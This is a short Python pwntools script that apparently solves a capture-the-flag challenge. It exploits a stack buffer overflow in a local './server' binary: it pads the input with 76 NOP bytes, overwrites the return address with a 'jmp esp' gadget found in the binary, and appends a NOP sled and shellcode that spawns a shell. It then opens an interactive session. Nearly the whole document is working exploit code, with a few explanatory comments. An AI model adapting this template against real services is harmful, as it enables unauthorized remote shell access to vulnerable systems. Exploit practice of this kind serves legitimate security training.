from pwn import *

exe = './server'
context.log_level = 'debug'

elf = context.binary = ELF(exe, checksec=False)
p = elf.process()

padding = 76

# automating the search for the jmp esp gadget (could just use ropper)
jmp_esp = asm('jmp esp')
jmp_esp = next(elf.search(jmp_esp))

# build the shell craft payload

#shellcode = asm(shellcraft.cat('flag.txt'))
shellcode = asm(shellcraft.sh())
shellcode += asm(shellcraft.exit())

# no operate instructions can be helpful in making sure that nothing executes
# they are also sometimes necessary to place some distance between stuff on the stack and shellcode so that it executes properly

payload = flat(

		asm('nop') * padding,
		jmp_esp,
		asm('nop') * 16,
		shellcode

	)

p.sendlineafter(b':', payload)
p.interactive()